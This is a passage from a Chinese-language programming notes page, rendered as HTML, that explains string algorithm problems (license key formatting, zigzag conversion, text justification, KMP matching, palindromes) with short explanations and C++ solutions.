secondEnd)</span> </span>&#123;<br>        string third;<br>        <span class="hljs-type">int</span> carry = <span class="hljs-number">0</span>, cur = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span> (firstEnd &gt;= firstStart || secondEnd &gt;= secondStart ||<br>               carry != <span class="hljs-number">0</span>) &#123;<br>            cur = carry;<br>            <span class="hljs-keyword">if</span> (firstEnd &gt;= firstStart) &#123;<br>                cur += s[firstEnd] - <span class="hljs-string">&#x27;0&#x27;</span>;<br>                firstEnd--;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (secondEnd &gt;= secondStart) &#123;<br>                cur += s[secondEnd] - <span class="hljs-string">&#x27;0&#x27;</span>;<br>                secondEnd--;<br>            &#125;<br>            carry = cur / <span class="hljs-number">10</span>;<br>            cur %= <span class="hljs-number">10</span>;<br>            third.<span class="hljs-built_in">push_back</span>(cur + <span class="hljs-string">&#x27;0&#x27;</span>);<br>        &#125;<br>        <span class="hljs-built_in">reverse</span>(third.<span class="hljs-built_in">begin</span>(), third.<span class="hljs-built_in">end</span>());<br>        <span class="hljs-keyword">return</span> third;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="字符串变换">10. 字符串变换</h1><h2 id="密钥格式化">密钥格式化</h2><blockquote><p>我们可以从字符串 s的末尾开始往前取出字符构建新的字符串ans。每次取出字符时首先判断该字符是否为破折号，如果为破折号则跳过；否则将当前的字符计数cnt 加1，同时检查如果当前字符为小写字母则将其转化为大写字母，将当前字符加入到字符串ans 的末尾。对字符进行计数时，每隔 k 个字符就在字符串 ans中添加一个破折号。特殊情况需要处理，字符串 ans的最后一个字符为破折号则将其去掉。我们对已经构建的字符串 ans进行反转即为返回结果。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">string <span class="hljs-title">licenseKeyFormatting</span><span class="hljs-params">(string s, <span class="hljs-type">int</span> k)</span> </span>&#123;<br>        string ans;<br>        <span class="hljs-type">int</span> cnt = <span class="hljs-number">0</span>;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = s.<span class="hljs-built_in">length</span>() - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--) &#123;<br>            <span class="hljs-keyword">if</span> (s[i] != <span class="hljs-string">&#x27;-&#x27;</span>) &#123;<br>                ans.<span class="hljs-built_in">push_back</span>(<span class="hljs-built_in">toupper</span>(s[i]));<br>                <span class="hljs-keyword">if</span> (++cnt % k == <span class="hljs-number">0</span>) &#123;<br>                    ans.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&#x27;-&#x27;</span>);<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (ans.<span class="hljs-built_in">size</span>() &gt; <span class="hljs-number">0</span> &amp;&amp; ans.<span class="hljs-built_in">back</span>() == <span class="hljs-string">&#x27;-&#x27;</span>) &#123;<br>            ans.<span class="hljs-built_in">pop_back</span>();<br>        &#125;<br><br>        <span class="hljs-built_in">reverse</span>(ans.<span class="hljs-built_in">begin</span>(), ans.<span class="hljs-built_in">end</span>());<br><br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="z-字形变换">Z 字形变换</h2><blockquote><p>由于 Z 字形变换的周期为<code>t=2r−2</code>，因此对于矩阵第一行的非空字符，其对应的 idx 均为 t的倍数，即<code>idx≡0(mod t)</code>；同理，对于矩阵最后一行的非空字符，应满足<code>idx≡r−1(mod t)</code>。对于矩阵的其余行（行号设为i），每个周期内有两个字符，第一个字符满足<code>idx≡i(mod t)</code>，第二个字符满足<code>idx≡t−i(mod t)</code>。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">string <span class="hljs-title">convert</span><span class="hljs-params">(string s, <span class="hljs-type">int</span> numRows)</span> </span>&#123;<br>        <span class="hljs-type">int</span> n = s.<span class="hljs-built_in">length</span>();<br>        <span class="hljs-keyword">if</span> (numRows == <span class="hljs-number">1</span> || numRows &gt;= n) &#123;<br>            <span class="hljs-keyword">return</span> s;<br>        &#125;<br><br>        string ans;<br>        <span class="hljs-type">int</span> t = <span class="hljs-number">2</span> * numRows - <span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; numRows; i++) &#123; <span class="hljs-comment">// 枚举矩阵的行</span><br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j + i &lt; n; j += t) &#123;    <span class="hljs-comment">// 枚举每个周期的起始下标</span><br>                ans += s[i + j];    <span class="hljs-comment">// 当前周期的第一个字符</span><br>                <span class="hljs-keyword">if</span> (i &gt; <span class="hljs-number">0</span> &amp;&amp; i &lt; numRows - <span class="hljs-number">1</span> &amp;&amp; j + t - i &lt; n) &#123;<br>                    ans += s[j + t - i];    <span class="hljs-comment">// 当前周期的第二个字符</span><br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="文本左右对齐">文本左右对齐</h2><blockquote><p>根据题干描述的贪心算法，对于每一行，我们首先确定最多可以放置多少单词，这样可以得到该行的空格个数，从而确定该行单词之间的空格个数。根据题目中填充空格的细节，我们分以下三种情况讨论：</p><ul><li>当前行是最后一行：单词左对齐，且单词之间应只有一个空格，在行末填充剩余空格；</li><li>当前行不是最后一行，且只有一个单词：该单词左对齐，在行末填充空格；</li><li>当前行不是最后一行，且不只一个单词：设当前行单词数为numWords，空格数为 numSpaces，需要将空格均匀分配在单词之间。</li></ul></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-comment">// blank 返回长度为 n 的由空格组成的字符串</span><br>    <span class="hljs-function">string <span class="hljs-title">blank</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span> </span>&#123; <span class="hljs-keyword">return</span> <span class="hljs-built_in">string</span>(n, <span class="hljs-string">&#x27; &#x27;</span>); &#125;<br><br>    <span class="hljs-comment">// join 返回用 sep 拼接 [left, right) 范围内的 words 组成的字符串</span><br>    <span class="hljs-function">string <span class="hljs-title">join</span><span class="hljs-params">(vector&lt;string&gt;&amp; words, <span class="hljs-type">int</span> left, <span class="hljs-type">int</span> right, string sep)</span> </span>&#123;<br>        string s = words[left];<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = left + <span class="hljs-number">1</span>; i &lt; right; i++) &#123;<br>            s += sep + words[i];<br>        &#125;<br>        <span class="hljs-keyword">return</span> s;<br>    &#125;<br><br>    <span class="hljs-function">vector&lt;string&gt; <span class="hljs-title">fullJustify</span><span class="hljs-params">(vector&lt;string&gt;&amp; words, <span class="hljs-type">int</span> maxWidth)</span> </span>&#123;<br>        vector&lt;string&gt; ans;<br>        <span class="hljs-type">int</span> right = <span class="hljs-number">0</span>, n = words.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) &#123;<br>            <span class="hljs-type">int</span> left = right; <span class="hljs-comment">// 当前行的第一个单词在 words 的位置</span><br>            <span class="hljs-type">int</span> sumLen = <span class="hljs-number">0</span>;   <span class="hljs-comment">// 统计这一行单词长度之和</span><br>            <span class="hljs-comment">// 循环确定当前行可以放多少单词，注意单词之间应至少有一个空格</span><br>            <span class="hljs-keyword">while</span> (right &lt; n &amp;&amp;<br>                   sumLen + words[right].<span class="hljs-built_in">length</span>() + right - left &lt;= maxWidth) &#123;<br>                sumLen += words[right++].<span class="hljs-built_in">length</span>();<br>            &#125;<br><br>            <span class="hljs-comment">// 当前行是最后一行：单词左对齐，且单词之间应只有一个空格，在行末填充剩余空格</span><br>            <span class="hljs-keyword">if</span> (right == n) &#123;<br>                string s = <span class="hljs-built_in">join</span>(words, left, n, <span class="hljs-string">&quot; &quot;</span>);<br>                ans.<span class="hljs-built_in">emplace_back</span>(s + <span class="hljs-built_in">blank</span>(maxWidth - s.<span class="hljs-built_in">length</span>()));<br>                <span class="hljs-keyword">return</span> ans;<br>            &#125;<br><br>            <span class="hljs-type">int</span> numWords = right - left;<br>            <span class="hljs-type">int</span> numSpaces = maxWidth - sumLen;<br><br>            <span class="hljs-comment">// 当前行只有一个单词：该单词左对齐，在行末填充剩余空格</span><br>            <span class="hljs-keyword">if</span> (numWords == <span class="hljs-number">1</span>) &#123;<br>                ans.<span class="hljs-built_in">emplace_back</span>(words[left] + <span class="hljs-built_in">blank</span>(numSpaces));<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br><br>            <span class="hljs-comment">// 当前行不只一个单词</span><br>            <span class="hljs-type">int</span> avgSpaces = numSpaces / (numWords - <span class="hljs-number">1</span>);<br>            <span class="hljs-type">int</span> extraSpaces = numSpaces % (numWords - <span class="hljs-number">1</span>);<br>            string s1 =<br>                <span class="hljs-built_in">join</span>(words, left, left + extraSpaces + <span class="hljs-number">1</span>, <span class="hljs-built_in">blank</span>(avgSpaces + <span class="hljs-number">1</span>));<br>            string s2 =<br>                <span class="hljs-built_in">join</span>(words, left + extraSpaces + <span class="hljs-number">1</span>, right, <span class="hljs-built_in">blank</span>(avgSpaces));<br>            ans.<span class="hljs-built_in">emplace_back</span>(s1 + <span class="hljs-built_in">blank</span>(avgSpaces) + s2);<br>        &#125;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="字符串匹配">11. 字符串匹配</h1><h2 id="实现-strstr">实现 strStr()</h2><blockquote><p>法一：暴力匹配。让字符串 needle 与字符串 haystack 的所有长度为 n的子串均匹配一次。为了减少不必要的匹配，我们每次匹配失败即立刻停止当前子串的匹配，对下一个子串继续匹配。如果当前子串匹配成功，我们返回当前子串的开始位置即可。如果所有子串都匹配失败，则返回−1。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">strStr</span><span class="hljs-params">(string haystack, string needle)</span> </span>&#123;<br>        <span class="hljs-type">int</span> m = haystack.<span class="hljs-built_in">length</span>(), n = needle.<span class="hljs-built_in">length</span>();<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i + n &lt;= m; i++) &#123;<br>            <span class="hljs-type">bool</span> flag = <span class="hljs-literal">true</span>;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; n; j++) &#123;<br>                <span class="hljs-keyword">if</span> (haystack[i + j] != needle[j]) &#123;<br>                    flag = <span class="hljs-literal">false</span>;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (flag) &#123;<br>                <span class="hljs-keyword">return</span> i;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><blockquote><p>法二：KMP算法</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">strStr</span><span class="hljs-params">(string haystack, string needle)</span> </span>&#123;<br>        <span class="hljs-type">int</span> n = haystack.<span class="hljs-built_in">length</span>();<br>        <span class="hljs-type">int</span> m = needle.<span class="hljs-built_in">length</span>();<br><br>        <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">next</span><span class="hljs-params">(m)</span></span>;<br>        <span class="hljs-comment">// 变量 j 表示当前匹配的最长前缀的长度</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>, j = <span class="hljs-number">0</span>; i &lt; m; i++) &#123;<br>            <span class="hljs-keyword">while</span> (j &gt; <span class="hljs-number">0</span> &amp;&amp; needle[i] != needle[j]) &#123;<br>                j = next[j - <span class="hljs-number">1</span>];<br>            &#125;<br>            <span class="hljs-keyword">if</span> (needle[i] == needle[j]) &#123;<br>                j++;<br>            &#125;<br>            next[i] = j;<br>        &#125;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>, j = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>            <span class="hljs-keyword">while</span> (j &gt; <span class="hljs-number">0</span> &amp;&amp; haystack[i] != needle[j]) &#123;<br>                j = next[j - <span class="hljs-number">1</span>];<br>            &#125;<br>            <span class="hljs-keyword">if</span> (haystack[i] == needle[j]) &#123;<br>                j++;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (j == m) &#123;<br>                <span class="hljs-keyword">return</span> i - m + <span class="hljs-number">1</span>;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="重复叠加字符串匹配">重复叠加字符串匹配</h2><blockquote><p>问题转化： <em>b</em> 可以从第一个叠加的 <em>a</em>开始匹配成功。使用 KMP 算法来实现字符串匹配的功能。在应用 KMP算法时，被匹配字符串是循环叠加的字符串，所以下标要进行取余操作，并且匹配终止的条件为b 开始匹配的位置超过第一个叠加的 a。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">strStr</span><span class="hljs-params">(string haystack, string needle)</span> </span>&#123;<br>        <span class="hljs-type">int</span> n = haystack.<span class="hljs-built_in">length</span>();<br>        <span class="hljs-type">int</span> m = needle.<span class="hljs-built_in">length</span>();<br><br>        <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">next</span><span class="hljs-params">(m)</span></span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>, j = <span class="hljs-number">0</span>; i &lt; m; i++) &#123;<br>            <span class="hljs-keyword">while</span> (j &gt; <span class="hljs-number">0</span> &amp;&amp; needle[i] != needle[j]) &#123;<br>                j = next[j - <span class="hljs-number">1</span>];<br>            &#125;<br>            <span class="hljs-keyword">if</span> (needle[i] == needle[j]) &#123;<br>                j++;<br>            &#125;<br>            next[i] = j;<br>        &#125;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>, j = <span class="hljs-number">0</span>; i - j &lt; n; i++) &#123;<br>            <span class="hljs-keyword">while</span> (j &gt; <span class="hljs-number">0</span> &amp;&amp; haystack[i % n] != needle[j]) &#123;<br>                j = next[j - <span class="hljs-number">1</span>];<br>            &#125;<br>            <span class="hljs-keyword">if</span> (haystack[i % n] == needle[j]) &#123;<br>                j++;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (j == m) &#123;<br>                <span class="hljs-keyword">return</span> i - m + <span class="hljs-number">1</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">repeatedStringMatch</span><span class="hljs-params">(string a, string b)</span> </span>&#123;<br>        <span class="hljs-type">int</span> aLen = a.<span class="hljs-built_in">length</span>();<br>        <span class="hljs-type">int</span> bLen = b.<span class="hljs-built_in">length</span>();<br><br>        <span class="hljs-type">int</span> index = <span class="hljs-built_in">strStr</span>(a, b);<br><br>        <span class="hljs-keyword">if</span> (index == <span class="hljs-number">-1</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (aLen - index &gt;= bLen) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> (bLen + index - aLen - <span class="hljs-number">1</span>) / aLen + <span class="hljs-number">2</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="重复的子字符串">重复的子字符串</h2><blockquote><p>如果一个长度为 n 的字符串 s 可以由它的一个长度为 n ′ 的子串 s ′重复多次构成，那么：</p><ul><li>n 一定是 n ′ 的倍数；</li><li>s ′ 一定是 s 的前缀；</li><li>对于任意的 i∈[n ′ ,n)，有 s[i]=s[i−n ′]。</li></ul></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">repeatedSubstringPattern</span><span class="hljs-params">(string s)</span> </span>&#123;<br>        <span class="hljs-type">int</span> n = s.<span class="hljs-built_in">length</span>();<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i * <span class="hljs-number">2</span> &lt;= n; i++) &#123;<br>            <span class="hljs-keyword">if</span> (n % i == <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-type">bool</span> match = <span class="hljs-literal">true</span>;<br>                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = i; j &lt; n; j++) &#123;<br>                    <span class="hljs-keyword">if</span> (s[j] != s[j - i]) &#123;<br>                        match = <span class="hljs-literal">false</span>;<br>                        <span class="hljs-keyword">break</span>;<br>                    &#125;<br>                &#125;<br>                <span class="hljs-keyword">if</span> (match) &#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="最短回文串">最短回文串</h2><blockquote><ol type="1"><li><strong>匹配前缀和后缀</strong>：从字符串末尾开始向前遍历，找到最长的前缀，该前缀也是回文的一部分。</li><li><strong>判断是否已经是回文</strong>：如果整个字符串已经是回文，直接返回原字符串。</li><li><strong>构建新字符串</strong>：将未匹配的后缀部分反转并加到字符串前面，同时递归处理剩余的前缀部分，最后拼接成最终的最短回文字符串。</li></ol></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">string <span class="hljs-title">shortestPalindrome</span><span class="hljs-params">(string s)</span> </span>&#123;<br>        <span class="hljs-type">int</span> n = s.<span class="hljs-built_in">length</span>();<br><br>        <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = n - <span class="hljs-number">1</span>; j &gt;= <span class="hljs-number">0</span>; j--) &#123;<br>            <span class="hljs-keyword">if</span> (s[i] == s[j]) &#123;<br>                i++;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (i == n) &#123;<br>            <span class="hljs-keyword">return</span> s;<br>        &#125;<br><br>        string suffix = s.<span class="hljs-built_in">substr</span>(i);<br>        string prefix = suffix;<br>        <span class="hljs-built_in">reverse</span>(prefix.<span class="hljs-built_in">begin</span>(), prefix.<span class="hljs-built_in">end</span>());<br><br>        <span class="hljs-keyword">return</span> prefix + <span class="hljs-built_in">shortestPalindrome</span>(s.<span class="hljs-built_in">substr</span>(<span class="hljs-number">0</span>, i)) + suffix;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="中心拓展法">12. 中心拓展法</h1><h2 id="回文子串">回文子串</h2><blockquote><p>枚举每一个可能的回文中心，然后用两个指针分别向左右两边拓展，当两个指针指向的元素相同的时候就拓展，否则停止拓展。长度为<em>n</em> 的字符串会生成 2<em>n</em>−1 组回文中心 ，这样我们只要从 0 到2<em>n</em>−2 遍历 <em>i</em>，就可以得到所有可能的回文中心。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">countSubstrings</span><span class="hljs-params">(string s)</span> </span>&#123;<br>        <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> n = s.<span class="hljs-built_in">length</span>();<br><br>        <span class="hljs-comment">// 对于每个字符位置i，我们都会以它为中心或者以它和下一个字符的间隙为中心来尝试寻找回文子串。</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">2</span> * n - <span class="hljs-number">1</span>; i++) &#123;<br>            <span class="hljs-type">int</span> l = i / <span class="hljs-number">2</span>, r = i / <span class="hljs-number">2</span> + i % <span class="hljs-number">2</span>;<br>            <span class="hljs-keyword">while</span> (l &gt;= <span class="hljs-number">0</span> &amp;&amp; r &lt; n &amp;&amp; s[l] == s[r]) &#123;<br>                l--;<br>                r++;<br>                ans++;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="最长回文子串">最长回文子串</h2><blockquote><p>回文子串扩展。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">string <span class="hljs-title">longestPalindrome</span><span class="hljs-params">(string s)</span> </span>&#123;<br>        string ans;<br>        <span class="hljs-type">int</span> n = s.<span class="hljs-built_in">length</span>();<br>        <span class="hljs-type">int</span> max = INT_MIN;<br><br>        <span class="hljs-comment">// 对于每个字符位置i，我们都会以它为中心或者以它和下一个字符的间隙为中心来尝试寻找回文子串。</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">2</span> * n - <span class="hljs-number">1</span>; i++) &#123;<br>            <span class="hljs-type">int</span> l = i / <span class="hljs-number">2</span>, r = i / <span class="hljs-number">2</span> + i % <span class="hljs-number">2</span>;<br>            <span class="hljs-keyword">while</span> (l &gt;= <span class="hljs-number">0</span> &amp;&amp; r &lt; n &amp;&amp; s[l] == s[r]) &#123;<br>                <span class="hljs-keyword">if</span> (r - l + <span class="hljs-number">1</span> &gt; 